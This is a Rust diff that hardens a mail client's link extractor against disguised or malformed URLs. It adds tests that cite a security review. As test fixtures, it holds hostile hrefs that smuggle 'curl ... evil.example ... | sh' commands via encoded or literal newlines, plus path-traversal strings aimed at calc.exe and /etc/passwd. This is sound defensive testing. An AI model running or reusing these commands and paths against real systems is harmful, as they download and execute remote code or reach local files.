@@ -140,8 +140,11 @@ fn window_after(text: &str, start: usize, len: usize) -> &str {
     &text[start..end]
 }
 
+/// A URL in text runs to a space, a bracket or quote, or an invisible
+/// character (a left-to-right mark after a link in right-to-left mail ends
+/// it, as it does for a reader).
 static URL: LazyLock<Regex> =
-    LazyLock::new(|| Regex::new(r#"(?i)\bhttps?://[^\s<>"'()\[\]{}]+"#).unwrap());
+    LazyLock::new(|| Regex::new(r#"(?i)\bhttps?://[^\s<>"'()\[\]{}\p{Cc}\p{Cf}]+"#).unwrap());
 static HREF: LazyLock<Regex> =
     LazyLock::new(|| Regex::new(r#"(?i)href\s*=\s*["']([^"']+)["']"#).unwrap());
 /// What HTML loads rather than links to: `src`, `background`, `poster`,
@@ -166,12 +169,19 @@ static NOISE_WORDS: LazyLock<Regex> = LazyLock::new(|| {
 /// the text body repeats it, unless something links to it (`href`).
 pub fn links(text: &str, html: &str) -> Vec<String> {
     let mut found: Vec<String> = Vec::new();
+    let mut seen: HashSet<String> = HashSet::new();
+    // Where the hrefs are: the scan of the HTML for bare URLs skips them,
+    // so an href refused as a whole doesn't come back cut short.
+    let mut hrefs = Vec::new();
     for c in HREF.captures_iter(html) {
-        if let Some(url) = link_url(&c[1]) {
-            push_new(&mut found, url);
+        let value = c.get(1).expect("group 1");
+        hrefs.push(value.range());
+        if let Some(url) = link_url(value.as_str())
+            && seen.insert(url.clone())
+        {
+            found.push(url);
         }
     }
-    let linked = found.len();
     let mut loaded = HashSet::new();
     for c in LOADED.captures_iter(html) {
         let srcset = c.get(4).or(c.get(5));
@@ -180,12 +190,20 @@ pub fn links(text: &str, html: &str) -> Vec<String> {
             Some(set) => srcset_urls(set.as_str()),
             None => vec![value],
         };
-        loaded.extend(urls.into_iter().filter_map(link_url));
+        // Only compared with what is found, so not checked as a link.
+        loaded.extend(urls.into_iter().map(normalized_url));
     }
-    loaded.retain(|u| !found[..linked].contains(u));
-    for m in URL.find_iter(html).chain(URL.find_iter(text)) {
-        if let Some(url) = link_url(m.as_str()).filter(|u| !loaded.contains(u)) {
-            push_new(&mut found, url);
+    loaded.retain(|u| !seen.contains(u));
+    let in_href = |at: usize| hrefs.iter().any(|r| r.contains(&at));
+    let bare = URL
+        .find_iter(html)
+        .filter(|m| !in_href(m.start()))
+        .chain(URL.find_iter(text));
+    for m in bare {
+        if let Some(url) = link_url(m.as_str()).filter(|u| !loaded.contains(u))
+            && seen.insert(url.clone())
+        {
+            found.push(url);
         }
     }
     let rank = |u: &str| -> i32 {
@@ -220,16 +238,119 @@ fn srcset_urls(set: &str) -> Vec<&str> {
     urls
 }
 
-/// An http(s) URL as written in mail, without the punctuation around it.
+/// An http(s) URL as written in mail, without the punctuation around it,
+/// if it is a real web link ([`is_web_link`]) once read as a browser reads
+/// an href ([`normalized_url`]).
 fn link_url(raw: &str) -> Option<String> {
-    let url = raw
-        .trim()
-        .replace("&amp;", "&")
-        .trim_end_matches(['.', ',', ';', ':', '!', '?', '>'])
-        .to_string();
-    url.get(..4)
-        .is_some_and(|s| s.eq_ignore_ascii_case("http"))
-        .then_some(url)
+    let url = normalized_url(raw);
+    is_web_link(&url).then_some(url)
+}
+
+/// `raw` as a browser reads an href: HTML character references decoded,
+/// tabs and line breaks dropped, the ends trimmed (and the punctuation a
+/// sentence puts after a link), and spaces, controls and invisible
+/// characters inside percent-encoded.
+fn normalized_url(raw: &str) -> String {
+    let decoded = decode_entities(raw);
+    let flat: String = decoded
+        .chars()
+        .filter(|c| !matches!(c, '\t' | '\n' | '\r'))
+        .collect();
+    let trimmed = flat
+        .trim_matches(|c: char| c <= ' ' || c.is_whitespace())
+        .trim_end_matches(['.', ',', ';', ':', '!', '?', '>']);
+    let mut out = String::with_capacity(trimmed.len());
+    for c in trimmed.chars() {
+        if c.is_whitespace() || c.is_control() || is_invisible(c) {
+            let mut buf = [0; 4];
+            for b in c.encode_utf8(&mut buf).bytes() {
+                out.push_str(&format!("%{b:02X}"));
+            }
+        } else {
+            out.push(c);
+        }
+    }
+    out
+}
+
+/// The invisible characters a link may not hold as such: bidi controls and
+/// the other format characters, joiners and tag characters included.
+fn is_invisible(c: char) -> bool {
+    matches!(c, '\u{200C}' | '\u{200D}' | '\u{E0000}'..='\u{E007F}')
+        || crate::render::is_hidden_format(c)
+}
+
+/// Decodes HTML character references (`&amp;`, `&#38;`, `&#x26;`, and the
+/// few named ones URLs use); anything else is left as written.
+fn decode_entities(s: &str) -> String {
+    if !s.contains('&') {
+        return s.to_string();
+    }
+    let mut out = String::with_capacity(s.len());
+    let mut rest = s;
+    while let Some(i) = rest.find('&') {
+        out.push_str(&rest[..i]);
+        rest = &rest[i..];
+        let end = rest[1..]
+            .find(|c: char| !c.is_ascii_alphanumeric() && c != '#')
+            .map_or(rest.len(), |e| e + 1);
+        let name = &rest[1..end];
+        let ch = match name {
+            "amp" => Some('&'),
+            "lt" => Some('<'),
+            "gt" => Some('>'),
+            "quot" => Some('"'),
+            "apos" => Some('\''),
+            "nbsp" => Some('\u{A0}'),
+            _ => name
+                .strip_prefix("#x")
+                .or_else(|| name.strip_prefix("#X"))
+                .map(|h| u32::from_str_radix(h, 16))
+                .or_else(|| name.strip_prefix('#').map(str::parse::<u32>))
+                .and_then(Result::ok)
+                .and_then(char::from_u32),
+        };
+        match ch {
+            Some(c) if !name.is_empty() => {
+                out.push(c);
+                rest = &rest[end..];
+                rest = rest.strip_prefix(';').unwrap_or(rest);
+            }
+            _ => {
+                out.push('&');
+                rest = &rest[1..];
+            }
+        }
+    }
+    out.push_str(rest);
+    out
+}
+
+/// Whether `s` is a link a browser may be given: an absolute `http://` or
+/// `https://` URL (either case) that parses with a host, written without
+/// whitespace, backslashes, control or invisible format characters. A
+/// string that only starts with `http` (`http\..\setup.exe`,
+/// `http/../file.html`) is a path an opener would resolve on disk, and a
+/// newline in a link would run as a second command when pasted in a shell.
+pub fn is_web_link(s: &str) -> bool {
+    let rest = ["https://", "http://"].iter().find_map(|p| {
+        s.get(..p.len())
+            .filter(|head| head.eq_ignore_ascii_case(p))
+            .map(|_| &s[p.len()..])
+    });
+    let Some(rest) = rest else {
+        return false;
+    };
+    if rest.is_empty()
+        || rest.starts_with('/')
+        || s.chars()
+            .any(|c| c.is_whitespace() || c.is_control() || c == '\\' || is_invisible(c))
+    {
+        return false;
+    }
+    reqwest::Url::parse(s).is_ok_and(|u| {
+        matches!(u.scheme(), "http" | "https") && u.host_str().is_some_and(|h| !h.is_empty())
+    })
 }
 
 /// Adds `url` to `list` unless it has it already.
@@ -310,6 +431,74 @@ mod tests {
         assert!(l.contains(&"https://example.com/about".to_string()));
         // An image isn't a link.
         assert!(!l.iter().any(|u| u.contains("logo.png")), "{l:?}");
+    }
+
+    #[test]
+    fn only_real_web_links_are_links() {
+        // Security review B1: strings that only start with `http` are paths
+        // an opener resolves on disk; B6: a newline would paste as a command.
+        let html = r#"<a href="http\..\..\Windows\System32\verify\..\calc.exe">Verify</a>
+            <a href="http/../../../../home/u/Downloads/verify.html">Verify</a>
+            <a href="httpfoo:verify">x</a> <a href="http:/verify.example/x">x</a>
+            <a href="http:\\verify.example\x">x</a> <a href="https:///etc/verify">x</a>
+            <a href="https://ok.example/verify?t=1&#10; curl -s https://evil.example/x | sh">x</a>
+            <a href="https://ok.example/verify?t=2
+curl https://evil.example/y">x</a>
+            <a href="HTTPS://Shop.Example/news">news</a>"#;
+        let l = links("http/../x/verify.html and http:verify", html);
+        // What the text scan finds in the bad hrefs is cut at the space or
+        // the newline so only whole web links are left.
+        assert_eq!(
+            l,
+            [
+                "https://ok.example/verify?t=1%20curl%20-s%20https://evil.example/x%20|%20sh",
+                "https://ok.example/verify?t=2curl%20https://evil.example/y",
+                "HTTPS://Shop.Example/news",
+            ]
+        );
+        for bad in [
+            "http\\..\\calc.exe",
+            "http/../a.html",
+            "http:/x.example",
+            "http:\\\\x.example\\a",
+            "https:///etc/passwd",
+            "https://",
+            "http://a b.example/",
+            "https://x.example/a\nb",
+            "https://x.example/\u{200B}",
+            "https://x.example/\u{202E}a",
+            "ftp://x.example/",
+            "https://[oops/",
+        ] {
+            assert!(!is_web_link(bad), "{bad:?}");
+        }
+        for good in [
+            "https://x.example",
+            "http://x.example:8080/a?b=c#d",
+            "HTTP://X.EXAMPLE/",
+        ] {
+            assert!(is_web_link(good), "{good:?}");
+        }
+    }
+
+    #[test]
+    fn links_are_read_as_a_browser_reads_them() {
+        // A mark after a link in right-to-left text ends it; references
+        // other than `&amp;` are decoded; a bidi override inside is escaped.
+        let text = "\u{5D0} https://x.example/verify?t=1\u{200E} \u{5D1}";
+        let html = "<a href=\"https://x.example/v?a=1&#38;token=abc&#x26;b=2\">v</a>\
+                    <a href=\"https://x.example/r\u{202E}a\">r</a>\
+                    <a href=\"https://x.example/n?name=Jo Doe&amp;t=9\">n</a>";
+        assert_eq!(
+            links(text, html),
+            [
+                "https://x.example/v?a=1&token=abc&b=2",
+                "https://x.example/verify?t=1",
+                "https://x.example/r%E2%80%AEa",
+                "https://x.example/n?name=Jo%20Doe&t=9",
+            ]
+        );
+        assert_eq!(decode_entities("a&b &#bad; &#x41;&gt"), "a&b &#bad; A>");
     }
 
     #[test]
